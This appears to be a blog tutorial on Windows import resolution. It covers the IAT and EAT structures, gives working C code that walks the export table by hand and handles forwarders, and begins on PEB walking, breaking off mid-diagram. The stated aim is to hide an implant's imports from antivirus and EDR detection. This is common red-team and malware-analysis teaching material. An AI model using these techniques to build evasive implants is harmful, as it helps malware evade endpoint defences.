---
tags:
  - PEB-Walking
  - IAT-Walking
---
# Windows Resolving Imports

![](/img/cover_peb_walking.png)

Before we hide anything, We need to understand what we're hiding from. Every time implant or whatever you made calls `VirtualAlloc` or `CreateThread`, windows already wired that call up before you first line of code ran through the Windows Loader and Import Address Table (IAT).

When we write `ResumeThread` and blah blah in C, the compiler doesn't embed the real address, it can't because ASLR randomizes `kernel32.dll`'s base on every boot. Instead it will try to be naughty and do indirect call through pointer table:

```c
call qword ptr[<IAT entry for ResumeThread>]
```

That pointer lives in `.idata` section, the IAT. The loader finds imports through IAT which is jus an array of `IMAGE_IMPORT_DESCRIPTOR` structs, one per DLL.

```c
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    DWORD OriginalFirstThunk;  // RVA  to Import Lookup Table (ILT), read-only)
    DWORD TimeDateStamp;
    DWORD ForwarderChain;
    DWORD Name;                // RVA to DLL name string e.g. "KERNEL32.dll"
    DWORD FirstThunk;          // RVA to IAT (patched by loader with real addresses)
} IMAGE_IMPORT_DESCRIPTOR;
```

Each entry in tables is either an ordinal (bit 63 set) or an RVA to an `IMAGE_IMPORT_BY_NAME`:

```c
typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD Hint;      // Index hint into EAT for fast lookup
    CHAR Name[1];   // "CreateThread\0"
} IMAGE_IMPORT_BY_NAME;
```

![](/img/ResumeThread.png)

In above image `pFile` is offset in file on disk (not in memory), `Data` is raw value stored in that offset. `0004BCE4` is an RVA pointing to the `IMAGE_IMPORT_BY_NAME` struct for ResumeThread. `Description` is what raw value represents. Each row here says `Hint/Name RVA` meaning this is the name import. The pair is stored as `Name + Hint` as discussed above. `Value` is what PEview has already followed that RVA and decoded the structure and `0038` there is Hint (the `WORD`) field in `IMAGE_EXPORT_BY_NAME` and `ResumeThread` is function name string.

As convenient it may seem this is root of the detection problem. Every function statically imported is listed in plaintext inside PE's import Directory. AV engine enumerate this list in milliseconds. 

Many people might think Export Address Table (EAT) and Import Address Table (IAT) are same but they are quite different. **IAT** is used by application to call functions provided by external libraries and **EAT** is used by a library (DLL) to publish functions so other applications and libraries can use them. 

Basically IAT is function this program wants to use and EAT is function this DLL provides to others :)

Here is IAT:

![](/img/iat.png)

Here is EAT:

![](/img/x64dbg-iat.png)
# Hiding Imports with `LoadLibrary` and `GetProcAddress` (Not a Good Way)

The loader handles static imports automatically at startup. These two APIs will do same at runtime. 

`LoadLibrary` internally calls `LdrLoadDll` which will first check `PEB->Ldr->InMemoryOrderModuleList` and if the DLL is already loaded it just returns to existing base. If DLL is not loaded it goes to the disk, map the file process its imports  and run `DllMain`. 

`GetProcAddress` manually walks the target DLL's Export Address Table:

1. Parses `IMAGE_EXPORT_DIRECTORY`
2. Binary search `AddressOfNames[]` for function name
3. Get index I and look up `AddressOfNameOrdinals[I]` and get ordinal 0
4. Return `AddressOfFunctions[0]` (If it's a forwarder RVA, recurse into the forwarded DLL)

If you didn't understood above steps don't worry we will implement this exact algorithm in the EAT walking section where everything will be explained.

```c
#include <windows.h>
#include <stdio.h>

int main() {

    FARPROC stuff = GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "VirtualProtect"
    );

    printf("0x%p\n", stuff);

    return 0;
}
```

Now if we open the `main.exe` we won't be able to find `VirtualProtect` in IAT:

![](/img/IATvirt.png)

But we will see `GetProcAddress` and `GetModuleHandleA` and the strings of `VirtualAlloc` can also be seen in `.rdata`:

![](/img/rdata.png)

This can be resolved by API hashing which we will do later but the main problem is that mature EDRs hooks on `LdrLoadDll` which means that every load is logged including `LoadLibrary` and also `GetProcAddress` hooks on `GetProcAddressForCaller` which means every resolution is logged. The only exit is to replicate the loader behavior i.e  walk the PEB to find loaded module bases without `LoadLibrary`, walk the EAT directly without `GetProcAddress`, and keep zero suspicious entries in your Import Directory.
# Little bit of yapping on PE

The IAT lives inside PE. It's table of function pointers, one slot per imported function, that the loader fills in at the load time with the real virtual addresses. When code calls `VirtualAlloc` it's going through one of these slots, an indirect call through a pointer the loader wrote.

The EAT lives inside the DLL. As said before it's how DLL says "here are the function I want to share". `kernel32.dll` has one. `ntdll.dll` has one. When the loader needs to fill your IAT slot for `VirtualAlloc`, it goes and reads `kernel32.dll` EAT to find actual address.

<svg width="100%" viewBox="0 0 680 340" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5"
            markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke"
            stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    </marker>
  </defs>

  <!-- Box 1: IAT -->
  <rect x="240" y="20" width="200" height="56" rx="8"
        fill="#EEEDFE" stroke="#534AB7" stroke-width="0.5"/>
  <text x="340" y="43" text-anchor="middle" dominant-baseline="central"
        font-size="14" font-weight="500" fill="#3C3489">Your PE's IAT</text>
  <text x="340" y="61" text-anchor="middle" dominant-baseline="central"
        font-size="12" fill="#534AB7">import table</text>

  <!-- Arrow 1 -->
  <line x1="340" y1="76" x2="340" y2="118"
        stroke="#7F77DD" stroke-width="1.5" marker-end="url(#arrow)"/>
  <text x="370" y="101" text-anchor="start" font-size="12" fill="#888780">loader reads</text>

  <!-- Box 2: EAT -->
  <rect x="240" y="120" width="200" height="56" rx="8"
        fill="#E1F5EE" stroke="#0F6E56" stroke-width="0.5"/>
  <text x="340" y="143" text-anchor="middle" dominant-baseline="central"
        font-size="14" font-weight="500" fill="#085041">kernel32.dll EAT</text>
  <text x="340" y="161" text-anchor="middle" dominant-baseline="central"
        font-size="12" fill="#0F6E56">export directory</text>

  <!-- Arrow 2 -->
  <line x1="340" y1="176" x2="340" y2="218"
        stroke="#1D9E75" stroke-width="1.5" marker-end="url(#arrow)"/>
  <text x="370" y="201" text-anchor="start" font-size="12" fill="#888780">resolves to</text>

  <!-- Box 3: Real VA -->
  <rect x="240" y="220" width="200" height="56" rx="8"
        fill="#FAEEDA" stroke="#854F0B" stroke-width="0.5"/>
  <text x="340" y="243" text-anchor="middle" dominant-baseline="central"
        font-size="14" font-weight="500" fill="#633806">VirtualAlloc VA</text>
  <text x="340" y="261" text-anchor="middle" dominant-baseline="central"
        font-size="12" fill="#854F0B">real address</text>
</svg>

As pain in ass it is, the loader does this for every imported function, for every imported DLL, before entry point runs. By the time `main()` executes all IAT slots are already filled.
## Export Directory Structure

The EAT is backed by `IMAGE_EXPORT_DIRECTORY`, which you can find via `OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]`:

```c
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD  MajorVersion;
    WORD  MinorVersion;
    DWORD Name;                  // RVA to DLL name string
    DWORD Base;                  // Ordinal base (usually 1)
    DWORD NumberOfFunctions;     // Total entries in AddressOfFunctions
    DWORD NumberOfNames;         // Number of named exports
    DWORD AddressOfFunctions;    // RVA to array of function RVAs (indexed by ordinal - Base)
    DWORD AddressOfNames;        // RVA to array of RVAs to function name strings
    DWORD AddressOfNameOrdinals; // RVA to array of WORDs mapping name index -> ordinal
} IMAGE_EXPORT_DIRECTORY;
```

Above all these can be explained one by one but the main we need for now that does most of work array are:

- `AddressOfNames[]` = array of RVAs, each pointing to a null-terminated function name strings. So `AddressOfNames[3]` might point to `"VirtualAlloc"`.
- `AddressOfNameOrdinals[]` = parallel to `AddressOfNames`, each entry is a WORD that maps to name's index to its ordinal. So `AddressOfNameOrdinals[3]` might give `15`.
- `AddressOfFunctions[]` = array of function RVAs indexed by ordinal. So `AddressOfFunctions[15]` gives you actual RVA of `VirtualAlloc`.
# EAT Walking

Now that the fundamentals are done let's see steps of resolving a function by name:

1. Walk `AddressOfNames[]` until you find a match.
2. Use that index `i` to read `AddressOfNameOrdinals[i]` which gives you the ordinal.
3. Use the ordinal (minus `Base`) to index to `AddressOfFunctions[]` which is our function RVA.
4. Add the DLL's base address thats the VA we can call.

<svg width="100%" viewBox="0 0 680 420" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5"
            markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke"
            stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    </marker>
  </defs>

  <!-- Step 1 -->
  <rect x="140" y="20" width="400" height="64" rx="8"
        fill="#EEEDFE" stroke="#534AB7" stroke-width="0.5"/>
  <text x="160" y="46" dominant-baseline="central"
        font-size="12" font-weight="500" fill="#3C3489">1. Walk AddressOfNames[]</text>
  <text x="160" y="66" dominant-baseline="central"
        font-size="12" fill="#534AB7">until name matches, note the index i</text>

  <line x1="340" y1="84" x2="340" y2="124"
        stroke="#7F77DD" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 2 -->
  <rect x="140" y="126" width="400" height="64" rx="8"
        fill="#E1F5EE" stroke="#0F6E56" stroke-width="0.5"/>
  <text x="160" y="152" dominant-baseline="central"
        font-size="12" font-weight="500" fill="#085041">2. Read AddressOfNameOrdinals[i]</text>
  <text x="160" y="172" dominant-baseline="central"
        font-size="12" fill="#0F6E56">gives you the ordinal for that name</text>

  <line x1="340" y1="190" x2="340" y2="230"
        stroke="#1D9E75" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 3 -->
  <rect x="140" y="232" width="400" height="64" rx="8"
        fill="#FAEEDA" stroke="#854F0B" stroke-width="0.5"/>
  <text x="160" y="258" dominant-baseline="central"
        font-size="12" font-weight="500" fill="#633806">3. Index AddressOfFunctions[ordinal - Base]</text>
  <text x="160" y="278" dominant-baseline="central"
        font-size="12" fill="#854F0B">gives you the function RVA</text>

  <line x1="340" y1="296" x2="340" y2="336"
        stroke="#BA7517" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 4 -->
  <rect x="140" y="338" width="400" height="64" rx="8"
        fill="#E6F1FB" stroke="#185FA5" stroke-width="0.5"/>
  <text x="160" y="364" dominant-baseline="central"
        font-size="12" font-weight="500" fill="#0C447C">4. DLL base + RVA</text>
  <text x="160" y="384" dominant-baseline="central"
        font-size="12" fill="#185FA5">final VA that's ready to call</text>

</svg>

This is what `GetProcAddress` does internally and what we are going to replicate without calling `GetProcAddress`. We will create a function `LoadFunction(PBYTE Module, LPSTR FunctionName)` that:

- Takes DLL's base address and function name string.
- Manually parses the export directory.
- Walks the name table, matches the name, resolves via ordinal.
- Returns the function's virtual address.

Starting from the DLL base, the path to the export directory is:

```c
DLL base
  => IMAGE_DOS_HEADER.e_lfanew         (offset to NT headers)
  => IMAGE_NT_HEADERS
  => OptionalHeader.DataDirectory[0]   (IMAGE_DIRECTORY_ENTRY_EXPORT)
  => VirtualAddress                    (RVA of IMAGE_EXPORT_DIRECTORY)
```

Full code:

```cpp
#include <windows.h>
#include <stdio.h>
#include <string.h>

PVOID LoadFunction( PBYTE Module, LPSTR FunctionName )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    LPSTR                   FoundName        = NULL;
    CHAR  LowerFoundName   [ MAX_PATH ]      = { 0 };
    CHAR  LowerFunctionName[ MAX_PATH ]      = { 0 };

    // Lowercase the target function name for case-insensitive comparison
    RtlSecureZeroMemory( LowerFunctionName, MAX_PATH );
    memcpy( LowerFunctionName, FunctionName, strlen( FunctionName ) );
    CharLowerBuffA( LowerFunctionName, strlen( FunctionName ) );

    // Walk to NT headers, then to the export directory
    NtHeader     = (PIMAGE_NT_HEADERS)( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory = (PIMAGE_EXPORT_DIRECTORY)( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );

    // Resolve the three EAT arrays from their RVAs
    AddrOfNames     = (PDWORD)( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions = (PDWORD)( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals  = (PWORD) ( Module + ExpDirectory->AddressOfNameOrdinals );

    // Walk every named export
    for ( DWORD I = 0; I < ExpDirectory->NumberOfNames; I++ )
    {
        RtlSecureZeroMemory( LowerFoundName, MAX_PATH );

        // AddrOfNames[I] is an RVA to the name string — add module base
        FoundName = ( PCHAR ) Module + AddrOfNames[ I ];

        memcpy( LowerFoundName, FoundName, strlen( FoundName ) );
        CharLowerBuffA( LowerFoundName, strlen( FoundName ) );

        if ( !strcmp( LowerFoundName, LowerFunctionName ) )
        {
            // AddrOfOrdinals[I] gives the ordinal index into AddrOfFunctions
            FunctionAddr = (PVOID)( Module + AddrOfFunctions[ AddrOfOrdinals[ I ] ] );
            return FunctionAddr;
        }
    }

    return NULL;
}
```

Add main function below of it and test:

```c
int main(void)
{
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) {
        printf("[-] Failed to get kernel32 base\n");
        return 1;
    }

    printf("[+] kernel32.dll base: %p\n\n", k32);

    // Test a few functions
    const char* targets[] = { "VirtualAlloc", "WriteProcessMemory", "CreateThread" };

    for (int i = 0; i < 3; i++) {
        PVOID realVA   = (PVOID)GetProcAddress(k32, targets[i]);
        PVOID customVA = LoadFunction((PBYTE)k32, (LPSTR)targets[i]);

        printf("Function: %s\n", targets[i]);
        printf("  GetProcAddress: %p\n", realVA);
        printf("  LoadFunction:   %p\n", customVA);
        printf("  Match: %s\n\n", (realVA == customVA) ? "YES" : "NO");
    }

    return 0;
}
```

```bash
PS C:\Users\At0m\Desktop> .\eat.exe
[+] kernel32.dll base: 00007ffb86250000

Function: VirtualAlloc
  GetProcAddress: 00007ffb86268c90
  LoadFunction:   00007ffb86268c90
  Match: YES

Function: WriteProcessMemory
  GetProcAddress: 00007ffb8628d2f0
  LoadFunction:   00007ffb8628d2f0
  Match: YES

Function: CreateThread
  GetProcAddress: 00007ffb8626bd30
  LoadFunction:   00007ffb8626bd30
  Match: YES
```

Everything seems good till now but if we add some API like `HeapAlloc` and test:

```bash
PS C:\Users\At0m\Desktop> .\eat.exe
[+] kernel32.dll base: 00007ffb86250000

Function: HeapAlloc
  GetProcAddress: 00007ffb8817a9a0
  LoadFunction:   00007ffb862f3617
  Match: NO
```

Uh oh! This doesn't match. `GetProcAddress` returned something at `0x7ffb881...` while our `LoadFunction` returned `0x7ffb862...` which is suspiciously close to `kernel32`'s base of `0x7ffb86250000`. If we tried to actually call that pointer, we'd jump straight into garbage and crash. So what happened?

`HeapAlloc` doesn't actually live in `kernel32.dll`. The real implementation is in `ntdll.dll` as `RtlAllocateHeap`. But for backwards compability `kernel32` still has no export for same `HeapAlloc` so old programs keep linking. `kernel32` exports `HeapAlloc` but instead of pointing to the code, it points to a string that says "go look in `ntdll` RtlAllocateHeap" (Ya can think of it as symbolic link inside of PE format). That string is called a **forwarder**. Microsoft uses this everywhere so they can shuffle implementation between `kernel32`, `kernelbase` and `ntdll` across Windows version without breaking apps. We can look it from the x64dbg too:

![](/img/forwarders.png)

We ask "does this RVA point inside the export section, or somewhere else in the image?" A real function's RVA points into `.text` (code section) which is way outside the export directory region. A forwarder string lives inside `.edata` because the linker stuffs it there alongside the other export metadata. 

Format is always `"DLLNAME.FunctionName"`, dot-separated and null-terminated. So our resolution algorithm needs one more step:

- Walk `AddressOfNames[]` until name matches, note index `i`.
- Read `AddressOfNameOrdinals[i]` to get the ordinal.
- Read `AddressOfFunctions[ordinal - Base]` to get the RVA.
- **Check if the RVA falls inside the export directory region**. If it does, it's a forwarder, read it as a string, split on the dot, get the base of the forwarded DLL, recurse.
- Otherwise add the DLL base and return.

The check itself is two comparisons. We need the export directory's RVA and size from the data directory:

```cpp
DWORD ExpDirRVA  = NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
DWORD ExpDirSize = NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

DWORD FuncRva = AddrOfFunctions[AddrOfOrdinals[I]];

if (FuncRva >= ExpDirRVA && FuncRva < ExpDirRVA + ExpDirSize)
{
    // Forwarder. Read as string like "NTDLL.RtlAllocateHeap"
    LPSTR Forwarder = (LPSTR)(Module + FuncRva);

    // Split on '.'
    CHAR DllName[MAX_PATH]  = { 0 };
    CHAR FuncName[MAX_PATH] = { 0 };

    LPSTR Dot = strchr(Forwarder, '.');
    if (!Dot) return NULL;

    size_t DllLen = Dot - Forwarder;
    memcpy(DllName, Forwarder, DllLen);
    strcpy(DllName + DllLen, ".dll");        // "NTDLL" -> "NTDLL.dll"
    strcpy(FuncName, Dot + 1);                // "RtlAllocateHeap"

    // Get the forwarded DLL's base. For now we use GetModuleHandleA,
    // but in the final implant this will be another PEB walk.
    HMODULE NextModule = GetModuleHandleA(DllName);
    if (!NextModule) return NULL;

    // Recurse, the forwarded DLL might forward again
    return LoadFunction((PBYTE)NextModule, FuncName);
}

// Normal export
FunctionAddr = (PVOID)(Module + FuncRva);
return FunctionAddr;
```

Forwarders can chain The DLL you forward to might itself forward somewhere else. `kernel32.HeapAlloc` -> `ntdll.RtlAllocateHeap` is one hop but other APIs can chain through `kernelbase` and the `api-ms-win-*` API set DLLs. Always recurse, never assume one hop is enough.

Full code:

```cpp
#include <windows.h>
#include <stdio.h>
#include <string.h>

PVOID LoadFunction( PBYTE Module, LPSTR FunctionName )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    LPSTR                   FoundName        = NULL;
    CHAR  LowerFoundName   [ MAX_PATH ]      = { 0 };
    CHAR  LowerFunctionName[ MAX_PATH ]      = { 0 };

    // Lowercase the target function name for case-insensitive comparison
    RtlSecureZeroMemory( LowerFunctionName, MAX_PATH );
    memcpy( LowerFunctionName, FunctionName, strlen( FunctionName ) );
    CharLowerBuffA( LowerFunctionName, strlen( FunctionName ) );

    // Walk to NT headers, then to the export directory
    NtHeader     = (PIMAGE_NT_HEADERS)( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory = (PIMAGE_EXPORT_DIRECTORY)( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );

    // Grab export directory bounds for forwarder detection
    DWORD ExpDirRVA  = NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    DWORD ExpDirSize = NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;

    // Resolve the three EAT arrays from their RVAs
    AddrOfNames     = (PDWORD)( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions = (PDWORD)( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals  = (PWORD) ( Module + ExpDirectory->AddressOfNameOrdinals );

    // Walk every named export
    for ( DWORD I = 0; I < ExpDirectory->NumberOfNames; I++ )
    {
        RtlSecureZeroMemory( LowerFoundName, MAX_PATH );

        // AddrOfNames[I] is an RVA to the name string, add module base
        FoundName = ( PCHAR ) Module + AddrOfNames[ I ];

        memcpy( LowerFoundName, FoundName, strlen( FoundName ) );
        CharLowerBuffA( LowerFoundName, strlen( FoundName ) );

        if ( !strcmp( LowerFoundName, LowerFunctionName ) )
        {
            // AddrOfOrdinals[I] gives the ordinal index into AddrOfFunctions
            DWORD FuncRva = AddrOfFunctions[ AddrOfOrdinals[ I ] ];

            // Forwarder check: if the RVA points inside the export dir, it's a string
            if ( FuncRva >= ExpDirRVA && FuncRva < ExpDirRVA + ExpDirSize )
            {
                // Forwarder. Read as string like "NTDLL.RtlAllocateHeap"
                LPSTR Forwarder = (LPSTR)( Module + FuncRva );

                // Split on '.'
                CHAR DllName [ MAX_PATH ] = { 0 };
                CHAR FuncName[ MAX_PATH ] = { 0 };

                LPSTR Dot = strchr( Forwarder, '.' );
                if ( !Dot ) return NULL;

                size_t DllLen = Dot - Forwarder;
                memcpy ( DllName, Forwarder, DllLen );
                strcpy ( DllName + DllLen, ".dll" );    // "NTDLL" -> "NTDLL.dll"
                strcpy ( FuncName, Dot + 1 );           // "RtlAllocateHeap"

                // Get the forwarded DLL's base. For now we use GetModuleHandleA,
                // but in the final implant this will be another PEB walk.
                HMODULE NextModule = GetModuleHandleA( DllName );
                if ( !NextModule ) return NULL;

                // Recurse, the forwarded DLL might forward again
                return LoadFunction( (PBYTE)NextModule, FuncName );
            }

            // Normal export
            FunctionAddr = (PVOID)( Module + FuncRva );
            return FunctionAddr;
        }
    }

    return NULL;
}

int main(void)
{
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) {
        printf("[-] Failed to get kernel32 base\n");
        return 1;
    }

    printf("[+] kernel32.dll base: %p\n\n", k32);

    const char* targets[] = {
        "VirtualAlloc",
        "WriteProcessMemory",
        "CreateThread",
        "HeapAlloc"        // forwarder
    };

    for (int i = 0; i < 4; i++) {
        PVOID realVA   = (PVOID)GetProcAddress(k32, targets[i]);
        PVOID customVA = LoadFunction((PBYTE)k32, (LPSTR)targets[i]);

        printf("Function: %s\n", targets[i]);
        printf("  GetProcAddress: %p\n", realVA);
        printf("  LoadFunction:   %p\n", customVA);
        printf("  Match: %s\n\n", (realVA == customVA) ? "YES" : "NO");
    }

    return 0;
}
```

```powershell
PS C:\Users\At0m\Desktop> .\eat.exe
[+] kernel32.dll base: 00007ffb86250000

Function: VirtualAlloc
  GetProcAddress: 00007ffb86268c90
  LoadFunction:   00007ffb86268c90
  Match: YES

Function: WriteProcessMemory
  GetProcAddress: 00007ffb8628d2f0
  LoadFunction:   00007ffb8628d2f0
  Match: YES

Function: CreateThread
  GetProcAddress: 00007ffb8626bd30
  LoadFunction:   00007ffb8626bd30
  Match: YES

Function: HeapAlloc
  GetProcAddress: 00007ffb8817a9a0
  LoadFunction:   00007ffb8817a9a0
  Match: YES
```

So we have `LoadFunction` that resolves any export from a DLL base. But there is one ugly cheat sitting in our code, `GetModuleHandleA("kernel32.dll")`. That's still an import. It still shows up in the IAT. It defeats the entire point of what we are doing. If we can replace that one call we have a fully self-resolving implant that touches zero suspicious imports.

The replacement lives in a structure called the **PEB** (Process Environment Block). Every running process has one and Windows itself puts the base addresses of every loaded DLL inside it, including `kernel32.dll` and `ntdll.dll`. We just need to know where to look.
# PEB Walking
### TEB and PEB

When Windows creates a thread it also creates a **TEB** (Thread Environment Block) for it. The TEB holds per thread data like the thread ID, last error value, stack base etc. It also holds a pointer to the **PEB** which is process-wide.

The CPU keeps a pointer to the TEB and PEB in a `gs` segment register.

**x64:**

- TEB: `gs:[0x30]` (the `NtTib.Self` self-pointer)
- PEB: `gs:[0x60]`

**x86:**

- TEB: `fs:[0x18]` (the `NtTib.Self` self-pointer)
- PEB: `fs:[0x30]`


These offsets are documented, stable across every Windows version since XP and most importantly they don't require calling any API to read. The segment register is just sitting there. From the TEB we walk to the PEB at offset `0x60` (x64) or `0x30` (x86) and from PEB we walk to the loader data.

```c
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;              // this is what we want
    // ... rest doesn't matter for now
} PEB, *PPEB;
```

`Ldr` points to a `PEB_LDR_DATA` structure which holds three doubly linked lists of every module loaded in the process:

```c
typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;       // we'll use this one
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

`PEB_LDR_DATA` contains **three doubly-linked lists of the same modules**, just sorted differently:

| List                              | Sort order               |
| --------------------------------- | ------------------------ |
| `InLoadOrderModuleList`           | Order DLLs were loaded   |
| `InMemoryOrderModuleList`         | Order they sit in memory |
| `InInitializationOrderModuleList` | Order their DllMain ran  |

Three lists, same modules, different sort orders. We will use `InMemoryOrderModuleList`. Each entry in that list is a `LDR_DATA_TABLE_ENTRY`:

```c
 typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;        // we link from here
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;                        // the base address we want
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;           // "kernel32.dll" etc.
    // ... more fields
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

`BaseDllName` is a UNICODE_STRING (with wide chars not ASCII) which holds module name and `DllBase` is the memory base address. That is what `GetModuleHandleA` would return. So the algorithm is: walk the linked list, at each entry compare `BaseDllName` to `L"kernel32.dll"` and when it matches, grab the `DllBase`. We now have `Kernel32` base with no API call, no import, not IAT entry.

One catch with `InMemoryOrderModuleList`, the `LIST_ENTRY` in windows is just two pointers (`Flink`, `Blink`) chaining nodes basically doubly-linked list:

```c
struct LIST_ENTRY {
    LIST_ENTRY* Flink;   // forward link = next node
    LIST_ENTRY* Blink;   // back link = previous node
};
```

Normally simple linked list, the `LIST_ENTRY` sits at the start of struct so a `Flink` pointer points to the start of next struct. But in windows `_LDR_DATA_TABLE_ENTRY` has 33 `LIST_ENTRY` fields (one per list) and only first one sits at offset of 0 other ones are at other struct.

<svg width="100%" viewBox="0 0 680 540" xmlns="http://www.w3.org/2000/svg">
<defs>
<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
<path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
</marker>
<style>
.t  { font-family: sans-serif; font-size: 14px; fill: #2C2C2A; }
.ts { font-family: sans-serif; font-size: 12px; fill: #5F5E5A; }
.th { font-family: sans-serif; font-size: 14px; font-weight: 500; fill: #2C2C2A; }
</style>
</defs>
<text class="th" x="40" y="32" style="fill:#ffffff">LDR_DATA_TABLE_ENTRY in memory</text>
<text class="ts" x="40" y="50" style="fill:#ffffff"></text>
<!-- InLoadOrderLinks (gray) -->
<rect x="160" y="80" width="340" height="48" rx="6" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
<text class="th" x="330" y="100" text-anchor="middle" dominant-baseline="central" fill="#2C2C2A">InLoadOrderLinks</text>
<text class="ts" x="330" y="118" text-anchor="middle" dominant-baseline="central" fill="#444441">LIST_ENTRY (Flink, Blink)</text>
<text class="ts" x="100" y="108" text-anchor="end" style="fill:#ffffff">+0x00</text>
<!-- InMemoryOrderLinks (amber - highlighted) -->
<rect x="160" y="138" width="340" height="48" rx="6" fill="#FAEEDA" stroke="#BA7517" stroke-width="1.5"/>
<text class="th" x="330" y="158" text-anchor="middle" dominant-baseline="central" fill="#412402">InMemoryOrderLinks</text>
<text class="ts" x="330" y="176" text-anchor="middle" dominant-baseline="central" fill="#633806">LIST_ENTRY (Flink, Blink)</text>
<text class="ts" x="100" y="166" text-anchor="end" style="fill:#ffffff">+0x10</text>
<!-- InInitializationOrderLinks (gray) -->
<rect x="160" y="196" width="340" height="48" rx="6" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
<text class="th" x="330" y="216" text-anchor="middle" dominant-baseline="central" fill="#2C2C2A">InInitializationOrderLinks</text>
<text class="ts" x="330" y="234" text-anchor="middle" dominant-baseline="central" fill="#444441">LIST_ENTRY (Flink, Blink)</text>
<text class="ts" x="100" y="224" text-anchor="end" style="fill:#ffffff">+0x20</text>
<!-- DllBase (teal - highlighted) -->
<rect x="160" y="254" width="340" height="40" rx="6" fill="#E1F5EE" stroke="#0F6E56" stroke-width="0.5"/>
<text class="th" x="330" y="274" text-anchor="middle" dominant-baseline="central" fill="#04342C">DllBase</text>
<text class="ts" x="100" y="278" text-anchor="end" style="fill:#ffffff">+0x30</text>
<!-- EntryPoint (gray) -->
<rect x="160" y="304" width="340" height="32" rx="6" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
<text class="ts" x="330" y="320" text-anchor="middle" dominant-baseline="central" fill="#444441">EntryPoint</text>
<text class="ts" x="100" y="324" text-anchor="end" style="fill:#ffffff">+0x38</text>
<!-- BaseDllName (teal) -->
<rect x="160" y="346" width="340" height="40" rx="6" fill="#E1F5EE" stroke="#0F6E56" stroke-width="0.5"/>
<text class="th" x="330" y="366" text-anchor="middle" dominant-baseline="central" fill="#04342C">BaseDllName</text>
<text class="ts" x="100" y="370" text-anchor="end" style="fill:#ffffff">+0x58</text>
<!-- Annotations -->
<line x1="560" y1="162" x2="510" y2="162" stroke="#BA7517" stroke-width="1.5" marker-end="url(#arrow)"/>
<text class="ts" x="568" y="158" fill="#854F0B">Flink lands HERE</text>
<text class="ts" x="568" y="174" fill="#854F0B">(not at the top)</text>
<line x1="560" y1="274" x2="510" y2="274" stroke="#0F6E56" stroke-width="1.5" marker-end="url(#arrow)"/>
<text class="ts" x="568" y="270" fill="#085041">What you actually</text>
<text class="ts" x="568" y="286" fill="#085041">want is down here</text>
<!-- Bottom formulas -->
<text class="ts" x="40" y="430" style="fill:#ffffff">To get from the Flink pointer to DllBase:</text>
